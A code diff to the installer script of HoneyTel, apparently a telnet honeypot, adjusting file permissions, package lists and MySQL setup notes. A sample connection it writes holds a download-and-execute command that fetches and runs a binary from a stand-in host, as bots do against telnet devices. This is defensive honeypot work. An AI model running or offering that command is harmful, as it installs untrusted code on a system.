@@ -763,6 +763,8 @@ else
 	cd HoneyTel
 	sudo bash create_config.sh
 	sudo pip install -r requirements.txt
+	sudo touch .info
+	sudo chown $USER:$USER .info
 	echo "Sample Connection" >> .info
 	echo "" >> .info
 	echo "enable" >> .info
@@ -776,13 +778,14 @@ else
 	echo "rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit" >> .info
 	sleep 1
 	sudo apt-get install python-setuptools python-werkzeug \
-                python-flask python-flask-httpauth python-sqlalchemy \
+                python-flask python-sqlalchemy \
                 python-requests python-decorator python-dnspython \
                 python-ipaddress python-simpleeval python-yaml
-	sudo apt-get install mysql-server mysql-client
 	if [[ -f '.setup' ]]; then
 		sleep 1
 	else
+		sudo touch .setup
+		sudo chown $USER:$USER .setup
 		echo -e "When mysql opens in terminal please enter the following info \n making changes where necessary \n" >> .setup
 		echo "CREATE DATABASE telhoney CHARACTER SET latin1 COLLATE latin1_swedish_ci;" >> .setup
 		echo "grant all privileges on telhoney.* to telhoney@localhost identified by \"YOUR_PASSWORD\";" >> .setup
